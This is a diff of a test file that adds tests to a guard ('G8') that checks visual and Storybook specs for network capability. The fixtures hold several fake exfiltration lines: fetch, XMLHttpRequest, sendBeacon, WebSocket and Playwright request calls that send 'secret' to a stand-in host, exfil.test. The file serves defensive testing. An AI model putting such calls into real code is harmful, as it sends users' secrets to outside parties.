@@ -396,6 +396,56 @@ test("G8 accepts active inventory routes and leaves not-started routes pending",
   );
 });
 
+test("G8 rejects arbitrary fetch calls and request options in visual specs", async () => {
+  const result = await runVisualScope({
+    routes: ACTIVE_ROUTES,
+    source: visualSpec(SCREENS, {
+      runtimeCode:
+        'void fetch("https://exfil.test/collect", { method: "POST", body: "secret" });',
+    }),
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /network capability/);
+});
+
+test("G8 allows only the single canonical Storybook index fetch", async () => {
+  const result = await runVisualScope({
+    routes: ACTIVE_ROUTES,
+    storySource: storybookSpec({
+      runtimeCode:
+        'void fetch("https://exfil.test/collect", { method: "POST", body: "secret" });',
+    }),
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /canonical Storybook index/);
+});
+
+test("G8 rejects alternate network APIs in required visual specs", async () => {
+  const probes = [
+    'const xhr = new XMLHttpRequest(); xhr.open("POST", "https://exfil.test"); xhr.send("secret");',
+    'navigator.sendBeacon("https://exfil.test", "secret");',
+    'new WebSocket("wss://exfil.test");',
+    'new EventSource("https://exfil.test");',
+    'const transport = { fetch: (_url: string) => undefined }; transport.fetch("https://exfil.test");',
+    'void page.request.post("https://exfil.test", { data: "secret" });',
+    'void page["request"].post("https://exfil.test", { data: "secret" });',
+    'const route = { request: () => ({ url: () => "https://exfil.test" }) }; route.request().url();',
+    "let client: APIRequestContext;",
+  ];
+
+  for (const runtimeCode of probes) {
+    const result = await runVisualScope({
+      routes: ACTIVE_ROUTES,
+      source: visualSpec(SCREENS, { runtimeCode }),
+    });
+
+    assert.notEqual(result.status, 0, runtimeCode);
+    assert.match(result.output, /network capability/, runtimeCode);
+  }
+});
+
 test("G8 rejects Storybook runtime mutation of array iteration or dynamic code execution", async () => {
   const result = await runVisualScope({
     routes: ACTIVE_ROUTES,
